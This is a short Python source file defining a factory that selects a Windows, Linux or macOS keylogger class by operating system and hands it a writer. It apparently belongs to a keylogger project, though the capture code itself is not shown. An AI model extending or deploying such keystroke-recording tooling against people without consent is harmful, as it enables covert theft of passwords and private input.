from interfaces.i_writer import IWriter
from interfaces.i_key_logger import IKeyLogger
# from factories.window_title_factory import WindowTitleFactory
from utils.system_info import get_system_name

class KeyLoggerFactory:
    @staticmethod
    def create_logger(writer: IWriter) -> IKeyLogger:
        system = get_system_name()
        
        if system == "windows":
            from services.loggers.windows_key_logger import WindowsKeyLogger
            return WindowsKeyLogger(writer)
        elif system == "linux":
            from services.loggers.linux_key_logger import LinuxKeyLogger
            return LinuxKeyLogger(writer)
        elif system == "darwin": # macOS
            from services.loggers.mac_key_logger import MacKeyLogger
            return MacKeyLogger(writer)
            
        raise NotImplementedError(f"No key logger implementation for {system}")
